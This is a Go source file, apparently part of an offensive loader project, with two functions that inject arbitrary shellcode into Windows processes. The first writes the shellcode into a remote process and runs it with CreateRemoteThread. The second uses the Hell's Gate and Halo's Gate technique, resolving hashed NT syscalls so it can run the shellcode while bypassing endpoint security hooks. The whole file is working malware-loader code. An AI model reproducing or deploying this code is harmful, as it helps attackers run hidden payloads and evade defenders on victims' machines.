package loader

import (
	"errors"
	"syscall"
	"unsafe"
	"variant/xwindows"

	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"golang.org/x/sys/windows"
)

func CreateRemoteThread(shellcode []byte, pid int) error {
	var pHandle windows.Handle

	if pid == 0 {
		pHandle, _ = xwindows.GetCurrentProcess()
	} else {
		pHandle, _ = xwindows.OpenProcess(
			windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
			false,
			uint32(pid),
		)
	}

	addr, _ := xwindows.VirtualAllocEx(
		pHandle,
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	var bytesWritten uintptr
	errWP := xwindows.WriteProcessMemory(
		pHandle,
		addr,
		&shellcode[0],
		uintptr(len(shellcode)),
		&bytesWritten,
	)
	if errWP != nil {
		return errWP
	}

	var oldProtect uint32
	errVP := xwindows.VirtualProtectEx(
		pHandle,
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if errVP != nil {
		return errVP
	}

	_, errCR := xwindows.CreateRemoteThreadEx(
		pHandle,
		0,
		0,
		addr,
		0,
		0,
		0,
		0,
	)
	if errCR != nil {
		return errCR
	}

	if errCH := xwindows.CloseHandle(pHandle); errCH != nil {
		return errCH
	}

	return nil
}

/*

Hell's Gate + Halo's Gate technique

*/

func CreateRemoteThreadHalos(shellcode []byte) error {
	NtAllocateVirtualMemory, err := gabh.MemHgate("04262a7943514ab931287729e862ca663d81f515", str2sha1)
	if err != nil {
		return err
	}

	NtWriteVirtualMemory, err := gabh.MemHgate("6caed95840c323932b680d07df0a1bce28a89d1c", str2sha1)
	if err != nil {
		return err
	}

	NtProtectVirtualMemory, err := gabh.MemHgate("059637f5757d91ad1bc91215f73ab6037db6fe59", str2sha1)
	if err != nil {
		return err
	}

	NtCreateThreadEx, err := gabh.MemHgate("91958a615f982790029f18c9cdb6d7f7e02d396f", str2sha1)
	if err != nil {
		return err
	}

	var addr uintptr
	regionsize := uintptr(len(shellcode))

	r1, err := gabh.HgSyscall(
		NtAllocateVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		syscall.PAGE_READWRITE,
	)
	if r1 != 0 {
		return err
	}

	gabh.HgSyscall(
		NtWriteVirtualMemory,
		uintptr(0xffffffffffffffff),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
	)

	var oldProtect uintptr
	r2, err := gabh.HgSyscall(
		NtProtectVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r2 != 0 {
		return err
	}

	var hhosthread uintptr
	r3, err := gabh.HgSyscall(
		NtCreateThreadEx,
		uintptr(unsafe.Pointer(&hhosthread)),
		0x1FFFFF,
		0,
		uintptr(0xffffffffffffffff),
		addr,
		0,
		uintptr(0),
		0,
		0,
		0,
		0,
	)

	_, errWF := xwindows.WaitForSingleObject(windows.Handle(hhosthread), windows.INFINITE)
	if errWF != nil {
		return errWF
	}

	if r3 != 0 {
		return err
	}

	return nil
}
